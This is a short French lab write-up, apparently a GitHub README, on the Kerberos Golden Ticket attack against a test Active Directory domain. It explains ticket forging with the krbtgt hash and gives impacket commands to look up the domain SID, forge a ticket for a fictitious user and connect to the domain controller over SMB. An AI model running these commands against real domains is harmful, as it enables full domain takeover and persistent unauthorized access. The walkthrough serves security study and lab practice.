L'attaque Golden Ticket est l'étape ultime de la compromission du domaine.
L’attaquant en ayant le hash NTLM du krbtgt, il a la possibilité de forger le ticket
TGT et s’attribuer les droits qu’il veut même pour un utilisateur qui n’existe pas.Il injecte ce ticket en mémoire dans sa propre session (Pass-the-Ticket). Le
contrôleur de domaine reçoit le ticket, vérifie la signature avec son propre hash
krbtgt. Comme la signature est valide, il accorde l'accès à n'importe quelle
ressource sans vérifier si l'utilisateur existe vraiment ou si son mot de passe a changé


# Pour forger le ticket, l’attaquant a besoin SID du Controleur de Domaine, donc il

```
impacket-lookupsid lab-test.local/it_2:*********@192.168.174.133
```

<img width="1278" height="409" alt="image" src="https://github.com/user-attachments/assets/9a19ffe8-14e5-4f75-978e-31511b8e7044" />

# Forger le ticket TGT avec impacket-tikecter

```
impacket-ticketer -nthash ************ -domain-sid S-1-5-21-39*********** -domain lab-test.local GoldUser 
```

<img width="1277" height="365" alt="image" src="https://github.com/user-attachments/assets/ca8c4798-c919-417b-83ac-6ce92b2b35d6" />


# Connecter avec le ticket forgée via smb avec impacket-smbclient

```
impacket-smbclient -k -no-pass LAB-TEST/GoldUser@WIN-DC.lab-test.local
```

<img width="1029" height="234" alt="image" src="https://github.com/user-attachments/assets/12997eb9-b4d2-4ce2-8161-25f3c770afc2" />
